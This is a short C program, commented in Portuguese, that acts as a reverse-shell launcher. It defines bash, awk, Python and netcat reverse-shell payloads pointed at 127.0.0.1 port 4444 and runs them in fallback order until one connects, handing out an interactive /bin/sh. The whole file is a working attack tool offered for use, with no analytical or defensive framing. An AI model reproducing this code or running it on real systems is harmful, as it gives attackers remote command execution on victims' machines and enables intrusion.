#include <stdlib.h>
#include <unistd.h>

// Definições de payloads para facilitar a leitura
const char *BASH = "bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'";
const char *AWK = "awk 'BEGIN {s=\"/inet/tcp/0/127.0.0.1/4444\"; while(1) { printf \"> \" |& s; s |& getline c; if(c==\"exit\") break; while((c |& getline) > 0) print $0 |& s; close(c); }}' /dev/null";
const char *PY = "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
		 "s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);"
		 "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'";

int run(const char *path, const char *payload) {
    if (access(path, X_OK) == 0) {
        return (system(payload) == 0);
    }
    return 0;
}

int main(void) {
    // Sequência de fallback: tenta o método mais estável primeiro
    if (run("/bin/bash", BASH)) return 0;
    if (run("/usr/bin/awk", AWK)) return 0;
    if (run("/usr/bin/python3", PY)) return 0;

    // Último recurso: Netcat tradicional
    system("nc 127.0.0.1 4444 -e /bin/sh");

    return 0;
}
